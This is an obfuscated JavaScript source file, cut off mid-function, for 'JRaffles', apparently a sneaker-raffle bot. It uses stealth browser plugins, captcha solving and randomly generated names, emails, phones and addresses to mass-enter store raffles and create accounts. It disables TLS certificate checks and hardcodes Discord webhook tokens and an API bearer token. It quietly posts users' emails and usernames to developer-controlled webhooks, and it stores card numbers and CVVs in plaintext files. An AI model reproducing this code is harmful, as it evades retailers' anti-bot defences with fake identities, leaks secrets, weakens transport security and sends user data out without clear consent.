process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x3f6207 = require('fs'), _0x1231cd = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x2c9258(_0x182eba) {
    const _0x126cc7 = _0x3f6207['createWriteStream'](_0x182eba, { 'flags': 'a' }), _0x2e3ad6 = console['log'];
    console['log'] = function () {
        const _0x548b55 = Array['prototype']['slice']['call'](arguments), _0x305782 = _0x548b55['join']('\x20') + '\x0a';
        _0x126cc7['write'](_0x305782), _0x2e3ad6['apply'](console, _0x548b55);
    };
}
_0x2c9258('../logs/log\x20' + _0x1231cd);
var _0x3c1b34 = require('tough-cookie'), _0xc8c5aa = require('node-imap'), _0x1431a8 = require('util')['inspect'];
const _0x1d4048 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x3856ce } = require('discord.js');
var _0x2b82f5 = require('exe');
const { execFile: _0x4d906a } = require('child_process'), _0x284c7b = require('puppeteer-extra'), _0xbe4e97 = require('cross-spawn'), _0x88e53d = require('puppeteer-extra-plugin-recaptcha'), _0xecf9cb = require('puppeteer-extra-plugin-stealth'), _0xd12810 = require('chalk'), _0x369d34 = require('node-bash-title'), _0x4f7750 = require('axios'), _0x3a0f5b = require('papaparse');
var _0x55c204 = require('random-name');
const _0x67edce = require('request');
var _0x15f555 = require('prompt');
const _0x9ac3a8 = _0x67edce['jar']();
var _0x33c579 = {};
const _0x2bf778 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x24c3b5 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x1c236b = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x68c6de = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x1c31dd = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x15ba43 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x17514b = 'https://discord.com/api/webhooks/', _0x5abdef = '' + _0x17514b + _0x1c236b, _0x1fa40c = '' + _0x17514b + _0x68c6de, _0x485a18 = '' + _0x17514b + _0x2bf778, _0x3cc994 = '' + _0x17514b + _0x24c3b5, _0x2c2f0f = '' + _0x17514b + _0x1c31dd, _0x14a1d3 = '' + _0x17514b + _0x15ba43;
const _0x584ee8 = JSON['parse'](_0x3f6207['readFileSync']('country.json', 'utf-8')), _0x38fc3e = JSON['parse'](_0x3f6207['readFileSync']('../package.json', 'utf-8')), _0x5ddf1c = _0x38fc3e['version'];
var _0x506019, _0x15bf3f, _0xc13d39, _0x282bb6, _0x51e305, _0x4faa3d, _0x4ebc10, _0x260b78;
const _0x4f90e9 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x28bb6b = ![];
const _0x5507fc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x34726d = '0123456789';
var _0x224bb0 = _0x5507fc['split']('');
const _0x34db4c = require('auto-git-update'), _0x585633 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x50e0a5 = new _0x34db4c(_0x585633);
async function _0x45339b() {
    _0x51e305 = _0x3f6207['readdirSync']('../proxies'), _0x282bb6 = _0x3f6207['readdirSync']('../tasks'), !_0x3f6207['existsSync']('../accounts/fenom.csv') && _0x3f6207['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x3f6207['existsSync']('../accounts/paypal.csv') && _0x3f6207['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x3f6207['existsSync']('../accounts/bstn.csv') && _0x3f6207['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x3f6207['existsSync']('../accounts/eql.csv') && _0x3f6207['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x3f6207['existsSync']('../failed-tasks.csv') && _0x3f6207['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x3f6207['existsSync']('../successful-tasks.csv') && _0x3f6207['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x33c579 = JSON['parse'](_0x3f6207['readFileSync']('../settings.json', 'utf-8')), !_0x33c579['delay'] && (_0x33c579['delay'] = 0x3c, _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), !_0x33c579['threads'] && (_0x33c579['threads'] = 0x1, _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), !_0x33c579['masterMail'] && (_0x33c579['masterMail'] = 'yourmail@gmail.com', _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), !_0x33c579['CapSolver'] && (_0x33c579['CapSolver'] = 'yourkeyhere', _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), !_0x33c579['masterPassword'] && (_0x33c579['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), !_0x33c579['captchaKey'] && (_0x33c579['captchaKey'] = '', _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), !_0x33c579['useRandomProxy'] && (_0x33c579['useRandomProxy'] = !![], _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), !_0x33c579['shuffleTasks'] && (_0x33c579['shuffleTasks'] = ![], _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), !_0x33c579['webhook'] && (_0x33c579['webhook'] = '', _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), _0x33c579['delay'] <= 0x1388 && (_0x33c579['delay'] = _0x33c579['delay'] * 0x3e8), _0x33c579['AfewDelay'] && (delete _0x33c579['AfewDelay'], _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), _0x33c579['MahaDelay'] && (delete _0x33c579['MahaDelay'], _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), _0x33c579['footshopDelay'] && (delete _0x33c579['footshopDelay'], _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579, null, 0x2))), _0x33c579['MahaDelay'] = _0x33c579['delay'], _0x17514b = _0x33c579['webhook'], _0x4faa3d = _0x33c579['licenseKey'];
}
let _0x40622d, _0x3bc20b = [], _0x2f2e8b;
const _0x4b01dc = _0x305514 => new Promise(_0xadea05 => setTimeout(_0xadea05, _0x305514));
function _0x54670f(_0x17be47, _0x58b9f9) {
    return Math['floor'](Math['random']() * (_0x58b9f9 - _0x17be47 + 0x1) + _0x17be47);
}
function _0x284bb9(_0x4db6d5) {
    let _0x25a71a = _0x4db6d5['length'], _0x24c7bd;
    while (_0x25a71a != 0x0) {
        _0x24c7bd = Math['floor'](Math['random']() * _0x25a71a), _0x25a71a--, [_0x4db6d5[_0x25a71a], _0x4db6d5[_0x24c7bd]] = [
            _0x4db6d5[_0x24c7bd],
            _0x4db6d5[_0x25a71a]
        ];
    }
    return _0x4db6d5;
}
async function _0x27bb6f(_0x2c8d4d) {
    try {
        return _0x4f7750['post']('https://api.whop.com/api/v2/memberships/' + _0x2c8d4d + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x579c95) {
        console['log']('Error\x20checking\x20license:\x20' + _0x579c95['message']);
    }
}
async function _0x14f9e4(_0x197a53) {
    console['clear']();
    if (_0x197a53 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x16dcac = await _0x15f555['get']('License');
        if (_0x16dcac['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x4b01dc(0xbb8), _0x14f9e4(_0x197a53);
        _0x197a53 = _0x16dcac['License'], _0x33c579['licenseKey'] = _0x197a53, _0x4faa3d = _0x197a53, _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579));
    }
    console['log']('Checking\x20license\x20' + _0x4faa3d + '...'), await _0x4b01dc(0x320);
    const _0x115422 = await _0x27bb6f(_0x197a53);
    _0x4ebc10 = JSON['stringify'](_0x115422['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x260b78 = JSON['stringify'](_0x115422['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x115422)
        return console['log']('License\x20not\x20found');
    if (!_0x115422['data'])
        return console['log']('License\x20not\x20bound');
    return _0x115422['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x28bb6b = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x28bb6b = ![]);
}
async function _0x51a586() {
    var _0x4d2fef = await _0x15f555['get']('Module');
    return console['clear'](), _0x4d2fef['Module'];
}
;
async function _0x5daa9b() {
    var _0x66afa1 = await _0x15f555['get']('Setting');
    return console['clear'](), _0x66afa1['Setting'];
}
async function _0x24545a(_0x31f6ee) {
    var _0x2941c3 = [];
    for (file of _0x282bb6) {
        var _0x548f0f = _0x3f6207['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x3a0f5b['parse'](_0x548f0f, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x31f6ee['store'] && _0x2941c3['push'](file);
    }
    !_0x2941c3['length'] == 0x0 && (_0x282bb6 = _0x2941c3);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x510103 = 0x0; _0x510103 < _0x282bb6['length']; _0x510103++) {
        console['log']('\x20(' + _0x510103 + ')\x20' + _0x282bb6[_0x510103]);
    }
    console['log']('');
    var _0x3de75a = await _0x15f555['get']('Task');
    if (_0x3de75a['Task'] > _0x282bb6['length'] - 0x1 || isNaN(_0x3de75a['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4b01dc(0x3e8), _0x24545a();
    var _0x4a4595 = _0x3f6207['readFileSync']('../tasks/' + _0x282bb6[_0x3de75a['Task']], 'utf-8');
    return _0xc13d39 = _0x3a0f5b['parse'](_0x4a4595, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0xd12810['blue'](_0x282bb6[_0x3de75a['Task']])), _0x506019 = _0x282bb6[_0x3de75a['Task']], _0xc13d39;
}
async function _0x2db9f0() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x15ba1d = 0x0; _0x15ba1d < _0x51e305['length']; _0x15ba1d++) {
        console['log']('\x20(' + _0x15ba1d + ')\x20' + _0x51e305[_0x15ba1d]);
    }
    console['log']('');
    var _0x1b6695 = await _0x15f555['get']('Proxies');
    if (_0x1b6695['Proxies'] > _0x51e305['length'] - 0x1 || isNaN(_0x1b6695['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4b01dc(0x3e8), _0x2db9f0();
    var _0x446c6a = _0x3f6207['readFileSync']('../proxies/' + _0x51e305[_0x1b6695['Proxies']], 'utf-8')['split']('\x0a');
    let _0x171ff0 = _0x446c6a['map']((_0x130a52, _0x8667a3) => {
        sanatizeProxy = _0x130a52['replace']('\x0d', '');
        if (_0x446c6a[_0x8667a3 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x15bf3f = _0x51e305[_0x1b6695['Proxies']], console['clear'](), _0x171ff0;
}
async function _0x7989c7() {
    var _0x49ec32 = await _0x15f555['get']('Value');
    return console['clear'](), _0x49ec32['Value'];
}
async function _0x20efaf(_0x3fea76) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x1e6fdf = 0x0; _0x1e6fdf < _0x3fea76['length']; _0x1e6fdf++) {
        console['log']('\x20(' + _0x1e6fdf + ')\x20[' + _0x3fea76[_0x1e6fdf]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x1fc50a = await _0x15f555['get']('Module');
    return _0x1fc50a['Module'];
}
async function _0x7c691b() {
    var _0x3dfc02 = await _0x15f555['get']('Password');
    return console['clear'](), _0x3dfc02['Password'];
}
;
async function _0x14c09d() {
    var _0x3207e4 = await _0x15f555['get']('Links');
    return _0x3207e4['Links'];
}
;
async function _0x2d02a0() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0xd3568 = 0x0; _0xd3568 < _0x3bc20b['length']; _0xd3568++) {
        console['log']('\x20(' + _0xd3568 + ')\x20' + _0x3bc20b[_0xd3568]);
    }
    ;
    console['log']();
    let _0x5b40a1 = await _0x15f555['get']('Product');
    return console['clear'](), _0x5b40a1['Product'];
}
;
function _0x303e65() {
    var _0x5628eb = new Date(Date['now']())['toLocaleTimeString']();
    return _0x5628eb;
}
;
function _0x1ccd33() {
    var _0x26a15a = new Date(Date['now']())['toLocaleString']();
    return _0x26a15a['replace'](',', '');
}
async function _0x265172(_0x1934ab, _0x3dea21) {
    let _0x21e9db = { 'headers': { 'content-type': 'application/json' } };
    if (_0x5ddf1c != 'devkey') {
        await _0x4f7750['post'](_0x1934ab, _0x3dea21, _0x21e9db);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x4a5b92(_0x36e923, _0x1e5840, _0x4f1f32, _0x43476f, _0x10db07) {
    if (!_0x43476f && _0x4f1f32 == 'dev') {
        var _0xe1b8f8 = new _0x3856ce()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x1e5840['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x1e5840['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x36e923['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x33c579['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x4ebc10,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x36e923['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x36e923['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x5ddf1c,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0xe1b8f8['data'];
    } else {
        if (_0x43476f && _0x4f1f32 == 'dev') {
            var _0xe1b8f8 = new _0x3856ce()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x1e5840['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x4ebc10,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x1e5840['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x36e923['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x33c579['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x10db07,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x36e923['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x36e923['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x5ddf1c,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0xe1b8f8['data'];
        } else {
            if (_0x4f1f32 == 'pub') {
                var _0xe1b8f8 = new _0x3856ce()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x1e5840['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x1e5840['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x36e923['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x33c579['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x36e923['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x5ddf1c,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0xe1b8f8['data'];
            } else {
                if (_0x4f1f32 == 'acc' && !_0x43476f) {
                    var _0xe1b8f8 = new _0x3856ce()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x1e5840['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x4ebc10,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x1e5840['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x33c579['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x5ddf1c,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0xe1b8f8['data'];
                } else {
                    if (_0x4f1f32 == 'acc' && _0x43476f) {
                        var _0xe1b8f8 = new _0x3856ce()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x1e5840['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x4ebc10,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x10db07,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x1e5840['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x33c579['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x5ddf1c,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0xe1b8f8['data'];
                    } else {
                        if (_0x4f1f32 == 'open') {
                            var _0xe1b8f8 = new _0x3856ce()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x260b78)['addFields']({
                                'name': 'User',
                                'value': '' + _0x4ebc10,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x5ddf1c,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0xe1b8f8['data'];
                        } else {
                            if (!_0x43476f && _0x4f1f32 == 'ver') {
                                var _0xe1b8f8 = new _0x3856ce()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x1e5840['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x4ebc10,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x1e5840['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x33c579['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x5ddf1c,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0xe1b8f8['data'];
                            } else {
                                if (_0x43476f && _0x4f1f32 == 'ver') {
                                    var _0xe1b8f8 = new _0x3856ce()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x1e5840['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x4ebc10,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x10db07,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x1e5840['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x33c579['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x5ddf1c,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0xe1b8f8['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x32ecbd(_0x50662e, _0x3bc77c) {
    var _0xe6b4b2 = _0x50662e[_0x3bc77c]['Address1']['split'](''), _0x4e19fe = _0x50662e[_0x3bc77c]['Address2']['split'](''), _0x144c0e = _0x50662e[_0x3bc77c]['Email']['split']('@');
    for (var _0x2b60eb = 0x0; _0x2b60eb < _0xe6b4b2['length']; _0x2b60eb++) {
        if (_0xe6b4b2[_0x2b60eb] == 'X') {
            var _0x31eb1c = Math['round'](Math['random']() * (_0x5507fc['length'] - 0x1));
            _0xe6b4b2[_0x2b60eb] = _0x224bb0[_0x31eb1c];
        }
    }
    ;
    for (var _0x2b60eb = 0x0; _0x2b60eb < _0x4e19fe['length']; _0x2b60eb++) {
        if (_0x4e19fe[_0x2b60eb] == 'X') {
            var _0x31eb1c = Math['round'](Math['random']() * (_0x5507fc['length'] - 0x1));
            _0x4e19fe[_0x2b60eb] = _0x224bb0[_0x31eb1c];
        }
    }
    ;
    _0x50662e[_0x3bc77c]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x50662e[_0x3bc77c]['FirstName'] = _0x55c204['first']());
    _0x50662e[_0x3bc77c]['LastName']['toUpperCase']() == 'RANDOM' && (_0x50662e[_0x3bc77c]['LastName'] = _0x55c204['last']());
    _0x144c0e[0x0]['toUpperCase']() == 'RANDOM' ? _0x144c0e[0x0] = '' + _0x55c204['first']() + _0x55c204['last']() + _0x54670f(0x1, 0x3e7) + '@' : _0x144c0e[0x0] = _0x144c0e[0x0] + '@';
    _0x50662e[_0x3bc77c]['Email'] = _0x144c0e['join'](''), _0x50662e[_0x3bc77c]['Address1'] = _0xe6b4b2['join'](''), _0x50662e[_0x3bc77c]['Address2'] = _0x4e19fe['join']('');
    _0x50662e[_0x3bc77c]['Phone'] == 'RANDOM' && (_0x50662e[_0x3bc77c]['Phone'] = '0' + _0x54670f(0x5f5e100, 0x3b9ac9ff));
    if (_0x50662e[_0x3bc77c]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x50ff95 = _0x54670f(0x1, 0x270f);
        _0x50662e[_0x3bc77c]['Follower'] = '' + _0x55c204['first']() + _0x55c204['last']() + _0x50ff95 + '\x20';
    }
    _0x50662e[_0x3bc77c]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x50662e[_0x3bc77c]['HouseNumber'] = _0x54670f(0x1, 0xc8));
    if (_0x50662e[_0x3bc77c]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x3a6e72 = Math['round'](Math['random']() * (_0x5507fc['length'] - 0x1)), _0x50784d = _0x224bb0[_0x3a6e72];
        _0x50662e[_0x3bc77c]['Address1'] = _0x55c204['last']() + 'straat', _0x50662e[_0x3bc77c]['Zip'] == '' && (_0x50662e[_0x3bc77c]['Postcode'] = _0x54670f(0x3e8, 0x270f) + '\x20' + _0x50784d + _0x50784d, _0x50662e[_0x3bc77c]['Zip'] = _0x50662e[_0x3bc77c]['Postcode']), _0x50662e[_0x3bc77c]['HouseNumber'] = '' + _0x54670f(0x1, 0xc8);
    }
    return;
}
;
async function _0x2b505c(_0x2639e3, _0x1ea878) {
    _0x3f6207['appendFileSync']('../failed-tasks.csv', _0x1ccd33() + ',' + _0x1ea878['store'] + ',' + _0x1ea878['name'] + ',' + _0x2639e3['Url'] + ',' + _0x2639e3['Size'] + ',' + _0x2639e3['Follower'] + ',' + _0x2639e3['FirstName'] + ',' + _0x2639e3['LastName'] + ',' + _0x2639e3['Address1'] + ',' + _0x2639e3['Address2'] + ',' + _0x2639e3['HouseNumber'] + ',' + _0x2639e3['Zip'] + ',' + _0x2639e3['City'] + ',' + _0x2639e3['State'] + ',' + _0x2639e3['Country'] + ',' + _0x2639e3['Phone'] + ',' + _0x2639e3['Email'] + ',' + _0x2639e3['Password'] + ',' + _0x2639e3['PaymentMethod'] + ',' + _0x2639e3['CardType'] + ',' + _0x2639e3['NameOnCard'] + ',' + _0x2639e3['CardNumber'] + ',' + _0x2639e3['ExpiryDate'] + ',' + _0x2639e3['CVV'] + ',' + _0x2639e3['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x41d22(_0x19b2aa, _0x19020d) {
    _0x3f6207['appendFileSync']('../successful-tasks.csv', _0x1ccd33() + ',' + _0x19020d['store'] + ',' + _0x19020d['name'] + ',' + _0x19b2aa['Url'] + ',' + _0x19b2aa['Size'] + ',' + _0x19b2aa['Follower'] + ',' + _0x19b2aa['FirstName'] + ',' + _0x19b2aa['LastName'] + ',' + _0x19b2aa['Address1'] + ',' + _0x19b2aa['Address2'] + ',' + _0x19b2aa['HouseNumber'] + ',' + _0x19b2aa['Zip'] + ',' + _0x19b2aa['City'] + ',' + _0x19b2aa['State'] + ',' + _0x19b2aa['Country'] + ',' + _0x19b2aa['Phone'] + ',' + _0x19b2aa['Email'] + ',' + _0x19b2aa['Password'] + ',' + _0x19b2aa['PaymentMethod'] + ',' + _0x19b2aa['CardType'] + ',' + _0x19b2aa['NameOnCard'] + ',' + _0x19b2aa['CardNumber'] + ',' + _0x19b2aa['ExpiryDate'] + ',' + _0x19b2aa['CVV'] + ',' + _0x19b2aa['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x2fb59e() {
    let _0x1d02b6 = proxyFile['split']('\x0a'), _0x3a4e91 = _0x1d02b6['map']((_0x320f96, _0x1994aa) => {
        sanatizeProxy = _0x320f96['replace']('\x0d', '');
        if (_0x1d02b6[_0x1994aa + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3a4e91;
}
;
async function _0x22c7c6(_0x55e1c4, _0x513c67) {
    if (_0x38f5cf != 'yes')
        var _0x38f5cf = '', _0x2b982a = 0x0;
    async function _0x1b2ef6() {
        var _0x29a994 = _0x3f6207['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0xbff231 = _0x3a0f5b['parse'](_0x29a994, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x47b9c7 = 0x0; _0x47b9c7 < _0xbff231['length']; _0x47b9c7++) {
            console['log']('(' + _0x47b9c7 + ')\x20' + _0xbff231[_0x47b9c7]['Email']);
        }
